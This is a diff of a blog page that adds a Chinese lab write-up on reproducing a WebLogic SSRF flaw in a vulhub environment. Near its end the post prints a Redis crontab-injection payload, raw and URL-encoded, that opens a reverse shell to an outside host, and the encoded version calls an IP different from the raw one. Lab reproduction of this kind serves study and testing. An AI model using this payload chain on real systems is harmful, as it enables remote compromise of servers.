@@ -232,6 +232,172 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://jaychouzzk.github.io/2019/02/24/weblogic SSRF漏洞复现/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jaychouzzk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Jaychouzzk's blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/02/24/weblogic SSRF漏洞复现/" itemprop="url">未命名</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">發表於</span>
+              
+              <time title="創建於" itemprop="dateCreated datePublished" datetime="2019-02-24T19:24:14+08:00">
+                2019-02-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="weblogic-SSRF漏洞复现"><a href="#weblogic-SSRF漏洞复现" class="headerlink" title="weblogic SSRF漏洞复现"></a>weblogic SSRF漏洞复现</h1><p>这里使用vuhub中的weblogic SSRF漏洞环境</p>
+<p>环境下载地址为：</p>
+<pre><code>https://vulhub.org/
+</code></pre><p>打开链接<strong><a href="http://192.168.11.137:7001/uddiexplorer/" target="_blank" rel="noopener">http://192.168.11.137:7001/uddiexplorer/</a></strong>，可以发现此页面</p>
+<p><img src="/img/weblogic -SSRF-1.png" alt=""></p>
+<p>访问页面<strong>Search Public Registries</strong>，发现是用来搜索的页面</p>
+<p><strong><a href="http://192.168.11.137:7001/uddiexplorer/SearchPublicRegistries.jsp" target="_blank" rel="noopener">http://192.168.11.137:7001/uddiexplorer/SearchPublicRegistries.jsp</a></strong></p>
+<p><img src="/img/weblogic -SSRF-2.png" alt=""></p>
+<p>访问页面<strong>Search Private Registry</strong>，发现需要用户登录才可以进行操作</p>
+<p><strong><a href="http://192.168.11.137:7001/uddiexplorer/SearchPrivateRegistries.jsp" target="_blank" rel="noopener">http://192.168.11.137:7001/uddiexplorer/SearchPrivateRegistries.jsp</a></strong></p>
+<p><img src="/img/weblogic -SSRF-3.png" alt=""></p>
+<p>访问页面<strong>Publish Private Registry</strong>，发现也需要用户登录才可以进行操作</p>
+<p><strong><a href="http://192.168.11.137:7001/uddiexplorer/PublishToPrivateRegistry.jsp" target="_blank" rel="noopener">http://192.168.11.137:7001/uddiexplorer/PublishToPrivateRegistry.jsp</a></strong></p>
+<p><img src="/img/weblogic -SSRF-4.png" alt=""></p>
+<p>访问页面<strong>Modify Private Registry</strong>，发现也需要用户登录才可以进行操作</p>
+<p><strong><a href="http://192.168.11.137:7001/uddiexplorer/ModifyRegistry.jsp" target="_blank" rel="noopener">http://192.168.11.137:7001/uddiexplorer/ModifyRegistry.jsp</a></strong></p>
+<p><img src="/img/weblogic -SSRF-5.png" alt=""></p>
+<p>访问页面<strong>Setup UDDI Explorer</strong>，发现有一处可以输入url，可以尝试进行ssrf攻击</p>
+<p><strong><a href="http://192.168.11.137:7001/uddiexplorer/SetupUDDIExplorer.jsp" target="_blank" rel="noopener">http://192.168.11.137:7001/uddiexplorer/SetupUDDIExplorer.jsp</a></strong></p>
+<p><img src="/img/weblogic -SSRF-6.png" alt=""></p>
+<p>漏洞测试：<br>输入<a href="http://127.0.0.1:80" target="_blank" rel="noopener">http://127.0.0.1:80</a> ，在使用burpsuite抓下包，查看下数据包，可以看到，Response包中的状态码为302，应该是不存在ssrf漏洞</p>
+<p><img src="/img/weblogic -SSRF-7.png" alt=""></p>
+<p>尝试在<strong>Search Public Registries</strong>页面输入，发现返回了一个错误</p>
+<p><strong><a href="http://192.168.11.137:7001/uddiexplorer/SearchPublicRegistries.jsp" target="_blank" rel="noopener">http://192.168.11.137:7001/uddiexplorer/SearchPublicRegistries.jsp</a></strong></p>
+<p><img src="/img/weblogic -SSRF-8.png" alt=""></p>
+<p>使用burpsuit查看下数据包内容，发现此处的url好像是可以控制的</p>
+<p><img src="/img/weblogic -SSRF-9.png" alt=""></p>
+<p>将端口改为一个存在的端口再继续查看返回结果，可以看到，返回404</p>
+<p><img src="/img/weblogic -SSRF-10.png" alt=""></p>
+<p>将端口改为一个不存在的端口再继续查看返回结果，可以看到，返回not connect</p>
+<p><img src="/img/weblogic -SSRF-11.png" alt=""></p>
+<p>尝试使用dict等协议尝试进行端口扫描，会返回不识别此协议</p>
+<p><img src="/img/weblogic -SSRF-12.png" alt=""></p>
+<p>在虚拟机中使用docker inspect 98f9e676d014 命令来查看内网中redis服务的ip，ip为172.21.0.2</p>
+<p><img src="/img/weblogic -SSRF-13.png" alt=""></p>
+<p>尝试探测内网redis服务，探测成功</p>
+<p><img src="/img/weblogic -SSRF-14.png" alt=""></p>
+<p>尝试进行反弹shell，将以下代码进行url编码</p>
+<pre><code>set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.18.0.1/21 0&gt;&amp;1\n\n\n\n&quot; 
+config set dir /etc/ 
+config set dbfilename crontab 
+save
+</code></pre><p>得到payload：</p>
+<pre><code>test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F207.148.101.58%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
+</code></pre><p><img src="/img/weblogic -SSRF-15.png" alt=""></p>
+<p>成功反弹shell</p>
+<p><img src="/img/weblogic -SSRF-16.png" alt=""></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://jaychouzzk.github.io/2019/01/20/总结：waf绕过技巧-sql，不完整版待补充/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -3093,7 +3259,7 @@ configure: error: APR-util not found.  Please read the documentation.
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">文章</span>
                 </a>
               </div>
